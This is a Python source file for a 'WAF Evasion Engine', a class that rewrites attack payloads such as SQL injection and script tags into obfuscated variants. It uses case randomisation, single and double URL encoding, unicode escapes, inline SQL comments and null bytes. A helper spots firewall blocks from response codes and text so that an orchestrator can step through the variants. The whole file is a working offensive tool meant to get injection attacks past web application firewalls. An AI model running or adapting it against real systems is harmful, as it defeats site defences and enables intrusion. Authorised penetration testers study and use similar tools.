import urllib.parse
import random

class WAFEvasionEngine:
    """
    Intelligent Web Application Firewall (WAF) Evasion Engine.
    Dynamically mutates raw payloads into variations designed to bypass 
    simple regex filters and signature-based blocking (like ModSecurity).
    """
    
    def __init__(self, base_payload):
        self.base_payload = base_payload
        
    def generate_mutations(self):
        """
        Returns a prioritized list of payload mutations starting with the original
        and escalating to heavy obfuscation.
        """
        mutations = [
            self.base_payload,                 # 0: Standard
            self._mixed_case(self.base_payload), # 1: Mixed Case (sCRipT)
            self._url_encode(self.base_payload), # 2: Standard URL Encode
            self._double_url_encode(self.base_payload), # 3: Double URL Encode
            self._unicode_escape(self.base_payload),   # 4: \u003c Hex Encoding
            self._sql_inline_comments(self.base_payload), # 5: SQL specific inline
            self._null_byte_insertion(self.base_payload) # 6: Null byte poison
        ]
        # Remove duplicates while preserving order
        return list(dict.fromkeys(mutations))

    def _mixed_case(self, p):
        """Randomizes the case of alphabetical characters."""
        return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in p)

    def _url_encode(self, p):
        """Encodes all non-alphanumeric characters."""
        return urllib.parse.quote(p)

    def _double_url_encode(self, p):
        """Double encodes non-alphanumeric characters."""
        return urllib.parse.quote(urllib.parse.quote(p))

    def _unicode_escape(self, p):
        """
        Convert to unicode hex escapes (e.g., < becomes \u003c).
        Useful for JSON or Javascript contexts.
        """
        escaped = ""
        for char in p:
            if char.isalnum() or char.isspace():
                escaped += char
            else:
                escaped += f"\\u{ord(char):04x}"
        return escaped

    def _sql_inline_comments(self, p):
        """
        Inserts empty inline comments into SQL syntax to break regex word boundaries.
        e.g. UNION SELECT -> UNION/**/SELECT
        """
        if " " not in p:
            return p
        return p.replace(" ", "/**/")

    def _null_byte_insertion(self, p):
        """
        Appends or prepends a null byte to bypass WAF string length/termination checks.
        """
        return p + "%00"


def get_evasion_payloads(base_payload):
    """
    Helper function to wrap a payload and instantly return its mutated forms.
    """
    engine = WAFEvasionEngine(base_payload)
    return engine.generate_mutations()

def test_waf_blocking(response_obj):
    """
    Heuristic to determine if a WAF actively blocked the last request.
    If true, the orchestrator knows it MUST use the next mutation.
    """
    if response_obj.status_code in [403, 406, 429]:
        return True
        
    waf_signatures = ["mod_security", "cloudflare", "blocked", "forbidden", "waf", "security policy"]
    text_lower = response_obj.text.lower()
    
    for sig in waf_signatures:
        if sig in text_lower:
            return True
            
    header_str = str(response_obj.headers).lower()
    for sig in waf_signatures:
        if sig in header_str:
            return True
            
    return False
